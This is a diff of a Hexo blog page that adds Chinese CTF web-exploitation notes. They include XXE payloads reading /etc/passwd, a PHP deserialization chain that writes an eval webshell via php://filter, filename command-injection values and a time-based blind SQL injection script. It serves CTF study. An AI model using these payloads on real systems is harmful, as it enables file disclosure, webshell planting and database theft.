@@ -4,15 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>page | Hexo</title>
+  <title>web点1 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="page">
+  <meta name="description" content="1php取反编码绕过 echo(~&amp;#x27;内容&amp;#x27;)  检查文件长宽的getimagesize()函数绕过  这个用来获取图像大小及相关信息 成功就返回一个数组  1234567891011getimagesize() 函数返回的数组：Array(    [0] &#x3D;&gt; 290    [1] &#x3D;&gt; 69    [2] &#x3D;&gt; 3    [3] &#x3D;&gt; width&#x3D;&amp;q">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web点1">
 <meta property="og:url" content="http://example.com/2021/10/20/page-126/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1php取反编码绕过 echo(~&amp;#x27;内容&amp;#x27;)  检查文件长宽的getimagesize()函数绕过  这个用来获取图像大小及相关信息 成功就返回一个数组  1234567891011getimagesize() 函数返回的数组：Array(    [0] &#x3D;&gt; 290    [1] &#x3D;&gt; 69    [2] &#x3D;&gt; 3    [3] &#x3D;&gt; width&#x3D;&amp;q">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-10-20T07:54:33.000Z">
-<meta property="article:modified_time" content="2021-10-20T07:54:33.215Z">
+<meta property="article:modified_time" content="2021-10-21T02:00:42.567Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -85,7 +87,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      page
+      web点1
     </h1>
   
 
@@ -93,11 +95,104 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php取反编码绕过 echo(~&#x27;内容&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>检查文件长宽的getimagesize()函数绕过  这个用来获取图像大小及相关信息 成功就返回一个数组 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getimagesize() 函数返回的数组：</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 290</span><br><span class="line">    [1] =&gt; 69</span><br><span class="line">    [2] =&gt; 3</span><br><span class="line">    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;</span><br><span class="line">    [bits] =&gt; 8</span><br><span class="line">    [mime] =&gt; image/png</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>索引 0 给出的是图像宽度的像素值<br>索引 1 给出的是图像高度的像素值<br>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM<br>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签<br>索引 bits 给出的是图像的每种颜色的位数，二进制格式<br>索引 channels 给出的是图像的通道值，RGB 图像默认是 3<br>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(“Content-type: image/jpeg”);</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数finfo_file()其主要是识别PNG文件十六进制下的第一行信息，若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过getimagesize() 函数的检验使用Hex Fiend将图片其余数据删掉，只保留文件头：</span><br></pre></td></tr></table></figure>
+
+<p>上传svg格式文件 可进行神奇的操作变成xee漏洞<br>svg是xml的图片 存在可控内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;100&gt;</span><br><span class="line">     &lt;text x=&quot;10&quot; y=&quot;10&quot;&gt;123&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>直接通过DTD外部实体声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">XML内容：</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">         &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="不知道flag的路径-可以先用-proc-self-pwd-代表的是当前路径。可以构造-proc-self-pwd-flag-txt读取文件"><a href="#不知道flag的路径-可以先用-proc-self-pwd-代表的是当前路径。可以构造-proc-self-pwd-flag-txt读取文件" class="headerlink" title="不知道flag的路径,可以先用/proc/self/pwd/代表的是当前路径。可以构造/proc/self/pwd/flag.txt读取文件"></a>不知道flag的路径,可以先用/proc/self/pwd/代表的是当前路径。可以构造/proc/self/pwd/flag.txt读取文件</h5><p>最终构造的.svg 文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">    &lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br><span class="line">utf-8 转utf-16 绕过</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = file_put_contents($filename, $data);  file_put_contents 这个支持php伪协议 可以将base64编码过的shell写入$data</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function cleanContents(array $contents)    &#123;        $cachedProperties = array_flip([            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,        ]);        foreach ($contents as $path =&gt; $object) &#123;            if (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties);            &#125;        &#125;            return $contents;    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="array-intersect-key-函数用于比较两个（或更多个）数组的键名-，并返回交集。"><a href="#array-intersect-key-函数用于比较两个（或更多个）数组的键名-，并返回交集。" class="headerlink" title="array_intersect_key()函数用于比较两个（或更多个）数组的键名 ，并返回交集。"></a>array_intersect_key()函数用于比较两个（或更多个）数组的键名 ，并返回交集。</h5><p>第一段是数组赋值，第二段数组遍历并将两个数组的交际赋给$contents[$path]<br>所以**$object的键选$cachedProperties中任意一个都行**，这里选择path。值就是我们的shell的base64编码，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是 $object=array(&quot;path&quot;=&gt;&quot;&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;的base64(PD9waHAgZXZhbCgkX0dFVFsnYSddKTs/Pg==)&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function getCacheKey(string $name): string    &#123;        return $this-&gt;options[&#x27;prefix&#x27;] . $name;    &#125;$filename = $this-&gt;getCacheKey($name);</span><br></pre></td></tr></table></figure>
+
+<p>getcachekey方法 prefix用于文件名构造</p>
+<p>因为在后面写入文件的时候，前面拼接了一段别的php代码，而且这段代码会导致即便我们在后面拼接上shell也无法正常执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码中的**$data全部用base64解码转化过后再写入文件中**，其中前面拼接部分会被强制解码，从而变成一堆乱码。而我们写入的shell（base64编码过的）会解码成正常的木马文件。<br>这里唯一需要注意的是长度问题，我们需要shell部分<?php phpinfo()?>前面加起来的字节数为4的倍数(base64解码时不影响shell部分)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以$b-&gt;options[&#x27;prefix&#x27;]=&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;;已经可以确定了。</span><br></pre></td></tr></table></figure>
+
+<p>这段代码中的$data全部用base64解码转化过后再写入文件中，其中前面拼接部分会被强制解码，从而变成一堆乱码。而我们写入的shell（base64编码过的）会解码成正常的木马文件。<br>这里唯一需要注意的是长度问题，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们需要shell部分&lt;?php phpinfo()?&gt;前面加起来的字节数为4的倍数(base64解码时不影响shell部分)。</span><br></pre></td></tr></table></figure>
+
+<p>所以$b-&gt;options[‘prefix’]=’php://filter/write=convert.base64-decode/resource=./uploads/‘;已经可以确定了。</p>
+<p>现在只需要控制写入内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$date接收传参$data   = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    protected $store;    protected $key;    protected $expire;    public function __construct()    &#123;        $this-&gt;key = &#x27;pz.php&#x27;;    &#125;    public function start($tmp)&#123;        $this-&gt;store = $tmp;    &#125;&#125;class B&#123;    public $options;&#125;$a = new A();$b = new B();$b-&gt;options[&#x27;prefix&#x27;] = &quot;php://filter/write=convert.base64-decode/resource=&quot;;$b-&gt;options[&#x27;expire&#x27;] = 11;$b-&gt;options[&#x27;data_compress&#x27;] = false;$b-&gt;options[&#x27;serialize&#x27;] = &#x27;strval&#x27;;$a-&gt;start($b);$object = array(&quot;path&quot;=&gt;&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2FhYSddKTs/Pg==&quot;);$path = &#x27;111&#x27;;$a-&gt;cache = array($path=&gt;$object);$a-&gt;complete = &#x27;2&#x27;;echo urlencode(serialize($a));?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php伪协议/user.php?page=php://filter/convert.base64-encode/resource=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_url解析漏洞：$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);parse_str($uri[&#x27;query&#x27;],$query)</span><br></pre></td></tr></table></figure>
+
+<p>这种情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</span><br></pre></td></tr></table></figure>
+
+<p>会解析错误返回false 就可以进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>通过文件名代码执行漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/被过滤了，使用cd ..</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;;ls;#&quot;​                =&quot;cd ..;ls;#&quot;  切换目录​                =&quot;cd ..;cat wenjianming;#&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在堆叠注入的判断方法:名称处加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。根据判断方法，当我们在 username 输入 admin&#x27;或者 admin;&#x27; 提示报错username 输入 admin 或者admin&#x27;; 报错消失</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过mysql预处理与hex绕过过滤来构建脚本"><a href="#通过mysql预处理与hex绕过过滤来构建脚本" class="headerlink" title="通过mysql预处理与hex绕过过滤来构建脚本"></a><strong>通过mysql预处理与hex绕过过滤来构建脚本</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#author: c1e4rimport requestsimport jsonimport timedef main():    #题目地址    url = &#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;    #注入payload    payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;    flag = &#x27;&#x27;    for i in range(1,30):        #查询payload        payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;        for j in range(0,128):            #将构造好的payload进行16进制转码和json转码            datas = &#123;&#x27;username&#x27;:payloads.format(str_to_hex(payload.format(i,j))),&#x27;password&#x27;:&#x27;test213&#x27;&#125;            data = json.dumps(datas)            times = time.time()            res = requests.post(url = url, data = data)            if time.time() - times &gt;= 3:                flag = flag + chr(j)                print(flag)                breakdef str_to_hex(s):    return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])if __name__ == &#x27;__main__&#x27;:    main()</span><br></pre></td></tr></table></figure>
+
+<p>注入过程没有特殊回显常见词被过滤用<strong>16进制+mysql预处理来绕过加上时间盲注进行绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">sql: select hex(&#x27;select sleep(5)&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="下载到源码：前端的应用逻辑基础一般在contraller文件夹下"><a href="#下载到源码：前端的应用逻辑基础一般在contraller文件夹下" class="headerlink" title="下载到源码：前端的应用逻辑基础一般在contraller文件夹下"></a>下载到源码：前端的应用逻辑基础一般在contraller文件夹下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Controller/BaseController.php....public function loadView($viewName =&#x27;&#x27;, $viewData = [])&#123;   $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;   if(file_exists($this-&gt;viewPath))   &#123;      extract($viewData);      include $this-&gt;viewPath;   &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>loadview方法使用了<strong>extract 和include了一个文件</strong> </p>
+<p>只要viewdata可控 就能覆盖掉this-&gt;viewpath文件中的某些变量 而且这个是要返回给客户的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Controller/UserController.phppublic function actionIndex()&#123;    $listData = $_REQUEST;    $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这边存在对viewdata完全可控的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.......                if(!isset($img_file)) &#123;                    $img_file = &#x27;/../favicon.ico&#x27;;                &#125;                $img_dir = dirname(__FILE__) . $img_file;                $img_base64 = imgToBase64($img_dir);                echo &#x27;&lt;img src=&quot;&#x27; . $img_base64 . &#x27;&quot;&gt;&#x27;;       //图片形式展示                ?&gt;&lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpfunction imgToBase64($img_file) &#123;                return $img_base64; //返回图片的base64&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取$img_file 的内容 以base64输出 imgfile通过extract(viewdata)变量覆盖漏洞完全控制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">，而$viewData是受用户控制的完全控制的。所以这里就存在一个任意文件读取漏洞。</span><br><span class="line"></span><br><span class="line">所以可以通过访问img_file=  来获取文件</span><br></pre></td></tr></table></figure>
+
+
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/20/page-126/" data-id="ckuzhneyj000pv4w76qxrfjzi" data-title="page" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/10/20/page-126/" data-id="ckuzhneyj000pv4w76qxrfjzi" data-title="web点1" class="article-share-link">Share</a>
       
       
       
@@ -111,7 +206,7 @@
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          page
+          web点2
         
       </div>
     </a>
@@ -157,11 +252,11 @@
       <ul>
         
           <li>
-            <a href="/2021/10/20/page-127/">page</a>
+            <a href="/2021/10/20/page-127/">web点2</a>
           </li>
         
           <li>
-            <a href="/2021/10/20/page-126/">page</a>
+            <a href="/2021/10/20/page-126/">web点1</a>
           </li>
         
           <li>
